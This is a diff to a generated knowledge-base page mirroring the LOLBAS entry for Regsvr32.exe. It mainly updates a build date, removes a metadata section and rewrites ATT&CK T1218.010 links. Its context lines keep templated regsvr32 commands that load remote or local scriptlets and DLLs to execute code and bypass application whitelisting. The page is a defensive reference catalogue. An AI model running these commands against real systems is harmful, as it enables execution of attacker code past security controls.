@@ -4,7 +4,7 @@ framework: "lolbas"
 generated: "true"
 source_path: "yml/OSBinaries/Regsvr32.yml"
 source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regsvr32.yml"
-build_date: "2026-04-27 18:39:01"
+build_date: "2026-04-27 19:14:21"
 category: "OSBinaries"
 aliases:
   - "Regsvr32.exe"
@@ -20,16 +20,7 @@ tags:
 
 [[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]
 
-# Regsvr32.exe
-
 Used by Windows to register dlls
-
-## Metadata
-
-- Category: OSBinaries
-- Created: 2018-05-25
-- Author: Oddvar Moe
-- Source Path: yml/OSBinaries/Regsvr32.yml
 
 ## Paths
 
@@ -49,7 +40,7 @@ regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
 - Use Case: Execute code from remote scriptlet, bypass Application whitelisting
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.010]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218010-regsvr32|T1218.010: Regsvr32]]
 
 ### 2. AWL Bypass
 
@@ -62,7 +53,7 @@ regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
 - Use Case: Execute code from scriptlet, bypass Application whitelisting
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.010]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218010-regsvr32|T1218.010: Regsvr32]]
 
 ### 3. Execute
 
@@ -75,7 +66,7 @@ regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll
 - Use Case: Execute code from remote scriptlet, bypass Application whitelisting
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.010]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218010-regsvr32|T1218.010: Regsvr32]]
 
 ### 4. Execute
 
@@ -88,7 +79,7 @@ regsvr32.exe /s /u /i:{PATH:.sct} scrobj.dll
 - Use Case: Execute code from scriptlet, bypass Application whitelisting
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.010]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218010-regsvr32|T1218.010: Regsvr32]]
 
 ### 5. Execute
 
@@ -101,7 +92,7 @@ regsvr32.exe /s {PATH:.dll}
 - Use Case: Execute DLL file
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.010]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218010-regsvr32|T1218.010: Regsvr32]]
 
 ### 6. Execute
 
@@ -114,7 +105,7 @@ regsvr32.exe /u /s {PATH:.dll}
 - Use Case: Execute DLL file
 - Privileges: User
 - Operating System: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
-- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218.010]]
+- ATT&CK: [[kb/attack/techniques/T1218-system_binary_proxy_execution#^t1218010-regsvr32|T1218.010: Regsvr32]]
 
 ## Detections
 
